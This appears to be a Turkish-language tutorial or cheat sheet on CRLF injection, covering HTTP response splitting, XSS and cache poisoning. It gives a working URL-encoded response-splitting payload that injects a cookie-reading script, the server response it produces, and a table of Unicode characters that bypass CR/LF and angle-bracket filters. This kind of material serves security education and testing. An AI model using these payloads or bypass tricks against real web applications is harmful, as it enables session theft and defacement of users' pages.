# CRLF Nedir?
CRLF Injection, saldırganın HTTP başlıklarına CRLF karakterleri (\r\n) enjekte edebilmesi durumunda ortaya çıkar. Bu durum, HTTP Response Splitting'e yol açabilir. Bir web uygulaması, HTTP başlıklarını oluştururken kullanıcı girdisini kullanıyorsa. Saldırgan, bu girdiyi manipüle ederek ek başlıklar enjekte edebilir veya HTTP yanıtını bölebilir. Bu durum şu güvenlik risklerine yol açabilir:

- Cross-Site Scripting (XSS): İkinci yanıta kötü amaçlı script ekleme.
- Cache Poisoning: Yanlış içeriğin önbelleğe alınmasını sağlama.
- Header Manipulation: Başlıkları değiştirerek kullanıcıları veya sistemleri yanıltma.

# Cross-Site Scripting
CRLF injection ile en kolay istismar yöntemi, sayfanın gövdesini (body) yeniden yazmaktır. Bu teknik javascript kodu çalıştırmak için kullanılabilir.

Örnek istek:
```url
http://www.example.net/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0ALast-Modified%3A%20Mon%2C%2027%20Oct%202060%2014%3A50%3A18%20GMT%0AContent-Length%3A%2034%0A%20%0A%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

Sunucu yanıtı:
```http
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Mon, 27 Oct 2060 14:50:18 GMT
Content-Length: 39
 
<script>alert(document.cookie)</script>
```

# Filter Bypass
RFC 7230, çoğu HTTP başlık alanı değerinin yalnızca US-ASCII karakter setinin bir alt kümesini kullanması gerektiğini belirtir.

| UTF-8 Character | Hex | Unicode | Stripped |
| --------- | --- | ------- | -------- |
| `嘊` | `%E5%98%8A` | `\u560a` | `%0A` (\n) |
| `嘍` | `%E5%98%8D` | `\u560d` | `%0D` (\r) |
| `嘾` | `%E5%98%BE` | `\u563e` | `%3E` (>)  |
| `嘼` | `%E5%98%BC` | `\u563c` | `%3C` (<)  |